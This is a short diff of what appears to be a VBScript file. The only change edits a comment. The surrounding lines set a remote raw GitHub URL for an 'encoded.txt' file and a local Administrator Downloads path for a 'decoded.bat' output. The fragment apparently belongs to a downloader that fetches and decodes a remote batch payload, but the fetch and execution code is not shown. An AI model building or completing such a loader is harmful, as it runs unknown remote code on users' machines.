@@ -1,4 +1,4 @@
-' Define the URL of the encoded files
+' Define the URL of the encoded file!
 encodedFileUrl = "https://raw.githubusercontent.com/spooffewfe/yff/refs/heads/main/encoded.txt"
 decodedFilePath = "C:\Users\Administrator\Downloads\decoded.bat"
 
